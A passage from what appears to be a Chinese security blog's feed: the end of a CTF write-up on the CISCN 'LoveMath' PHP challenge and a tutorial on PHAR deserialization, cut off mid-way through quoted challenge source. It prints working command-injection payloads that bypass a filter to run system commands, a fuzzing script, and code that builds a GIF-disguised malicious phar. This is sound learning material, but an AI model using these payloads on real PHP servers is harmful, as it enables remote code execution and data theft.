punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>输出的结果既是可传入的值</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token variable">$pi</span><span class="token operator">=</span>base_convert<span class="token punctuation">,</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">47138</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">8768397090111664438</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p>分析：</p><ul><li><code>base_convert(47138,20,36)  ==&gt;  exec</code>，exec执行一个外部程序，返回最后一行内容</li><li><code>base_convert(8768397090111664438,10,30)  ==&gt;   getallheaders</code>，获取全部 HTTP 请求头信息</li><li>以上语句翻译下来就是<code>exec(getallheaders()&#123;1&#125;)</code>，可以获取请求头第一个字段的值，<code>[]</code>被waf可以用<code>&#123;&#125;</code>包囊数字来解决代替绕过中括号和引号</li></ul><p>发包即可拿到flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CISCN-LoveMath-php%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C/image-20200517213809635.png" alt loading="lazy"></p><p>当然这里直接<code>cat flag</code>也是可以的，如下：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token operator">=</span>base_convert<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">47138</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">3761671484</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">109270211243818</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>命令执行就是<code>exec(&quot;cat /*&quot;)</code>，可以打印出flag</p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>利用异或将字符串转化成我们想要的字符串，例如我们需要<code>$_GET</code>，那么就要获得<code>_GET</code>，FUZZ代码如下：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'abs'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan2'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atanh'</span><span class="token punctuation">,</span>  <span class="token string single-quoted-string">'bindec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ceil'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decbin'</span> <span class="token punctuation">,</span> <span class="token string single-quoted-string">'decoct'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'expm1'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'floor'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fmod'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hypot'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log10'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log1p'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'max'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'min'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'octdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pi'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pow'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'round'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">&lt;=</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span> <span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token variable">$payload</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">.</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"^<span class="token interpolation"><span class="token variable">$i</span></span><span class="token interpolation"><span class="token variable">$j</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">"==><span class="token interpolation"><span class="token variable">$exp</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>在打印出的结果中搜寻想要的字符串，找到最短的再组合</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token variable">$pi</span><span class="token operator">=</span><span class="token punctuation">(</span>is_nan<span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span>tan<span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$pi</span><span class="token operator">=</span><span class="token variable">$$pi</span><span class="token punctuation">;</span><span class="token variable">$pi</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0</span><span class="token operator">=</span>system<span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>cat <span class="token operator">/</span>flag</code></pre><ul><li><code>is_nan^(6).(4)  ==&gt;  _G</code></li><li><code>tan^(1).(5)  ==&gt;  ET</code></li><li>以上就和第一种方法类似，然后在传命令执行的代码就可以了</li></ul><p>参考：</p><ul><li><a href="https://www.cnblogs.com/20175211lyz/p/11588219.html">https://www.cnblogs.com/20175211lyz/p/11588219.html</a></li><li><a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html">https://www.cnblogs.com/wangtanzhi/p/12246731.html</a></li></ul><p>题目还是挺有意思的，如果再发现新方法再补上</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;  先看到题目给出的源码：&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.extrader.top/categories/CTF/"/>
    
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Phar反序列化浅析</title>
    <link href="https://www.extrader.top/posts/bb56c28a/"/>
    <id>https://www.extrader.top/posts/bb56c28a/</id>
    <published>2020-05-04T03:49:35.000Z</published>
    <updated>2020-11-08T07:16:22.652Z</updated>
    
    <content type="html"><![CDATA[<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://xz.aliyun.com/t/2958#toc-2">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a></li><li><a href="https://www.freebuf.com/articles/web/205943.html">PHAR反序列化拓展操作总结</a></li><li><a href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面</a></li></ul><span id="more"></span><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h4><p><strong>①</strong>  <strong>a stub</strong></p><p>可以理解为一个标志，格式为<code>xxx</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p><p><strong>②</strong>  <strong>a manifest describing the contents</strong></p><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的<code>meta-data</code>，这是上述攻击手法最核心的地方。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504124151781.png" alt loading="lazy"></p><p><strong>③</strong>  <strong>the file contents</strong></p><p>被压缩文件的内容。</p><p><strong>④</strong>  <strong>a signature for verifying Phar integrity (phar file format only)</strong></p><p>签名，放在文件末尾，格式如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504124231445.png" alt loading="lazy"></p><p>通过<code>phar://</code>伪协议对一个<strong>phar</strong>文件进行了文件操作的时候，就可以触发反序列化，达到<strong>RCE</strong>的效果</p><h4 id="产生缘由"><a href="#产生缘由" class="headerlink" title="产生缘由"></a>产生缘由</h4><p>在<a href="https://github.com/php/php-src/blob/29b56a878aa22310d645c3266110417e07ebe683/ext/phar/phar.c#L618">phar.c#L618</a>处，其调用了<code>php_var_unserialize</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504120955832.png" alt loading="lazy"></p><p>因此可以构造一个特殊的phar包，使得代码能够反序列化，从而构造一个pop链，在使用<code>phar://</code>协议读取文件的时候，文件会被解析成phar (<a href="https://www.php.net/manual/zh/intro.phar.php">https://www.php.net/manual/zh/intro.phar.php</a>) 的过程会触发<code>php_var_unserialize</code>函数对<strong>meta-data</strong>的操作，造成反序列化。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><strong>条件</strong></p><ul><li>phar文件要能够上传到服务器端。</li><li>要有可用的魔术方法作为“跳板”。</li><li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li></ul><p>有序列化数据必然会有反序列化操作，php一大部分的<a href="http://php.net/manual/en/ref.filesystem.php">文件系统函数</a>在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504120506980.png" alt loading="lazy"></p><ul><li><strong>exif</strong>：<code>exif_thumbnail</code>，<code>exif_imagetype</code></li><li><strong>gd</strong>：<code>imageloadfont</code>，<code>imagecreatefrom***</code></li><li><strong>hash</strong>：<code>hash_hmac_file</code>，<code>hash_file</code>，<code>hash_update_file</code>，<code>md5_file</code>，<code>sha1_file</code></li><li><strong>file/url</strong>：<code>get_meta_tags</code>，<code>get_headers</code></li><li><strong>standard</strong>：<code>getimagesize</code>，<code>getimagesizefromstring</code></li></ul><p><strong>zip</strong>：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$zip</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$zip</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'c.zip'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$zip</span><span class="token operator">-></span><span class="token function">extractTo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phar://test.phar/test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>限制<code>phar://</code>不能出现在头几个字符，亦适用于<code>compress.zlib://</code>：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$z</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'compress.bzip2://phar:///home/sx/test.phar/test.txt'</span><span class="token punctuation">;</span></code></pre><p><strong><a href="https://baike.baidu.com/item/PostgreSQL/530240?fr=aladdin">PostgreSQL</a></strong>：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pgsql:host=%s;dbname=%s;user=%s;password=%s"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"postgres"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"sx"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"123456"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">pgsqlCopyFromFile</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aa'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'phar://test.phar/aa'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><code>pgsqlCopyToFile</code>和<code>pg_trace</code>同样能使用的，需要开启<code>phar</code>的写功能。</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>生成<strong>phar</strong>文件：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">TestObject</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span>    <span class="token comment">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>notepad打开查看：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504131930692.png" alt loading="lazy"></p><p>明显的序列化存储</p><p>构造利用代码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token keyword">class</span> <span class="token class-name-definition class-name">TestObject</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Destruct called'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'phar://phar.phar/a_random_string'</span><span class="token punctuation">;</span>    <span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>成功打印结果，当然这里换其他的文件操作函数也可以</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504132140672.png" alt loading="lazy"></p><p><strong>将phar伪造成其他格式的文件</strong></p><p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">TestObject</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub，增加gif文件头</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span>    <span class="token comment">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>notepad打开查看：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504132602458.png" alt loading="lazy"></p><p>和上面的一样可以利用成功</p><h3 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h3><h4 id="CISCN2019-华北赛区-Day1-Web1-—Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-—Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]—Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]—Dropbox</h4><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212154616.png" alt loading="lazy"></p><p>先随便注册一个账号登录，随后发现有上传文件和下载，删除文件的功能</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212308364.png" alt loading="lazy"></p><p>测试文件上传，只能上传那三种图片的格式，应该是有白名单，且文件上传后路径不可知，于是抓包测试文件下载和删除功能，其中文件下载处存在文件下载漏洞，于是将整个网站的源码都下载下来，测试后发现，后台在下载界面还是做了权限限制的，不然根目录下的<code>flag</code>就可以直接下下来了</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212700778.png" alt loading="lazy"></p><p>有以下文件：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504213252372.png" alt loading="lazy"></p><p>login.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>.........(HTML)<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'register'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>toast('注册成功', 'info');&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$u</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">20</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$u</span><span class="token operator">-></span><span class="token function">verify_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uploads/"</span> <span class="token operator">.</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"sftUahRiTz"</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sandbox'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$sandbox</span><span class="token punctuation">;</span>        <span class="token 